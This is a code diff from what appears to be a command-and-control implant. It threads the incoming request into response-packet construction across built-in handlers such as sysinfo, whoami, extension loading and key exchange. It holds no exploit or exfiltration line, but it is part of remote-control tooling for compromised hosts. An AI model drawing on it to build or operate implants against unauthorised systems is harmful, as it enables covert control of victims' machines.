@@ -100,7 +100,7 @@
 
 static tlv_pkt_t *builtin_quit(c2_t *c2)
 {
-    return api_craft_tlv_pkt(API_CALL_QUIT);
+    return api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
 }
 
 static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
@@ -115,7 +115,7 @@ static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
     {
         if (tabs_add(&core->tabs, core->t_count, filename, NULL, strlen(filename)+1, c2) == 0)
         {
-            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
             tlv_pkt_add_u32(result, TLV_TYPE_TAB_ID, core->t_count);
             core->t_count++;
 
@@ -123,7 +123,7 @@ static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
         }
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
@@ -139,7 +139,7 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
     {
         if (tabs_add(&core->tabs, core->t_count, NULL, tab, tab_size, c2) == 0)
         {
-            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
             tlv_pkt_add_u32(result, TLV_TYPE_TAB_ID, core->t_count);
             core->t_count++;
             free(tab);
@@ -152,7 +152,7 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
         }
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
@@ -165,10 +165,10 @@ static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
 
     if (tabs_delete(&core->tabs, tab_id) == 0)
     {
-        return api_craft_tlv_pkt(API_CALL_SUCCESS);
+        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 static tlv_pkt_t *builtin_time(c2_t *c2)
@@ -185,7 +185,7 @@ static tlv_pkt_t *builtin_time(c2_t *c2)
     localtime_r(&time_ctx, &local_time);
     strftime(date_time, sizeof(date_time) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &local_time);
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
     tlv_pkt_add_string(result, TLV_TYPE_STRING, date_time);
 #else
     result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
@@ -208,17 +208,17 @@ static tlv_pkt_t *builtin_sysinfo(c2_t *c2)
     {
         log_debug("* Failed to sigar sysinfo (%s)\n",
                   sigar_strerror(core->sigar, status));
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
     if ((status = sigar_mem_get(core->sigar, &memory)) != SIGAR_OK)
     {
         log_debug("* Failed to sigar memory (%s)\n",
                   sigar_strerror(core->sigar, status));
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     tlv_pkt_add_string(result, TLV_TYPE_PLATFORM, sysinfo.name);
     tlv_pkt_add_string(result, TLV_TYPE_VERSION, sysinfo.version);
@@ -241,12 +241,12 @@ static tlv_pkt_t *builtin_whoami(c2_t *c2)
 
     if ((pw_entry = getpwuid(geteuid())))
     {
-        result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
         tlv_pkt_add_string(result, TLV_TYPE_STRING, pw_entry->pw_name);
     }
     else
     {
-        result = api_craft_tlv_pkt(API_CALL_FAIL);
+        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 #else
     result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
@@ -262,7 +262,7 @@ static tlv_pkt_t *builtin_uuid(c2_t *c2)
 
     core = c2->data;
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
     tlv_pkt_add_string(result, TLV_TYPE_UUID, core->uuid);
 
     return result;
@@ -297,7 +297,7 @@ static tlv_pkt_t *builtin_secure(c2_t *c2)
 
     if ((pkey_length = tlv_pkt_get_string(c2->request, TLV_TYPE_PUBLIC_KEY, pkey)) <= 0)
     {
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
     pkey_length++;
 
@@ -317,7 +317,7 @@ static tlv_pkt_t *builtin_secure(c2_t *c2)
         goto fail;
     }
 
-    c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
     tlv_pkt_add_bytes(c2->response, TLV_TYPE_KEY, buffer, length);
 
     log_debug("Symmetric key: \n");
@@ -331,7 +331,7 @@ static tlv_pkt_t *builtin_secure(c2_t *c2)
 
 fail:
     crypt_set_algo(c2->crypt, ALGO_NONE);
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 void register_builtin_api_calls(api_calls_t **api_calls)
